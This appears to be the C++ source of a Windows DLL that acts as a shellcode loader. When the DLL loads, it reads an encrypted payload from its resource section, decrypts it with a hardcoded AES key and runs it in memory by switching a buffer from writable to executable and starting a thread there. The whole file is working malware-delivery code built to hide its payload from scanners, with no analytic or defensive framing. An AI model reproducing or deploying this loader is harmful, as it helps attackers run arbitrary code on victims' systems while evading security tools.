#include <Windows.h>
#include <string>
#include "resource.h"
#include "pragmas.h"
#include "AES.h"

// Constants
// ------------------------------------------------------------------------

#define AESKEY "Passw0rd!"

// To convert hex string to raw byte string
// ------------------------------------------------------------------------

std::string hex_to_byte_string(std::string buffer) {
    int len = buffer.length();
    std::string newString;
    for (int i=0; i < len; i+=2) {
        std::string byte = buffer.substr(i,2);
        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
        newString.push_back(chr);
    }
    return newString;
}

// Inline-Execute shellcode using CreateThread()
// ------------------------------------------------------------------------

BOOL execute_shellcode(LPSTR payload, SIZE_T payloadLen) {
	// Init some important variables
	void* exec_mem;
	BOOL ret;
	HANDLE threadHandle;
    DWORD oldProtect = 0;
	
	// Allocate a RW memory buffer for payload
	exec_mem = VirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Write payload to new buffer
	RtlMoveMemory(exec_mem, payload, payloadLen);
	
	// Make new buffer as RX so that payload can be executed
	ret = VirtualProtect(exec_mem, payloadLen, PAGE_EXECUTE_READ, &oldProtect);

	// Now, run the payload
	if (ret != 0) {
		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(threadHandle, -1);
	}

	return TRUE;
}

// Call after DLL is loaded
// ------------------------------------------------------------------------

void go(HMODULE hMod) {
	// Retrieve payload from resource section
	HRSRC payloadRC = FindResourceA(hMod, MAKEINTRESOURCE(RID_PAYLOAD), RT_RCDATA);
	std::string payload = std::string(
		(LPCSTR)(LockResource(LoadResource(hMod, payloadRC))),
		SizeofResource(hMod, payloadRC)
	);

	if (payload.empty())
		return;

	// Separate IV from payload
	std::string iv = payload.substr(payload.length()-16);
    std::string ciphertext = payload.substr(0, payload.find(iv));

	// Decrypt the payload
	if (!aes_decrypt(ciphertext, iv, AESKEY)) {
		return;
	}

	// Convert the payload hex string to bytes
	payload = hex_to_byte_string(ciphertext);

	// Execute the payload locally
	execute_shellcode((LPSTR)payload.c_str(), payload.length());
}

// DllMain
// ------------------------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	HANDLE threadHandle;
	DWORD dwThread;

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		// Init Code here
	    threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)go, hinstDLL, 0, NULL);
        CloseHandle(threadHandle);
		break;

	case DLL_THREAD_ATTACH:
		// Thread-specific init code here
		break;

	case DLL_THREAD_DETACH:
		// Thread-specific cleanup code here
		break;

	case DLL_PROCESS_DETACH:
		// Cleanup code here
		break;
	}

	// The return value is used for successful DLL_PROCESS_ATTACH
	return TRUE;
}